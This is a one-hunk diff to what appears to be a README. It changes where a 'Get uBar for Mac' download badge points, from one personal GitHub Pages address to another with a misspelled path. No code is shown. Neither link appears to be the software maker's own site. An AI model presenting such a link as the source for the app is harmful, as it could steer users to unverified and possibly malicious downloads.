@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://nikolanfu.github.io/.github/ubarmac">  
+<a href="https://mitrobandus.github.io/.github/uburmac">  
 <img src="https://img.shields.io/badge/Get_uBar_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Get uBar for Mac">  
 </a>  
 </div>  
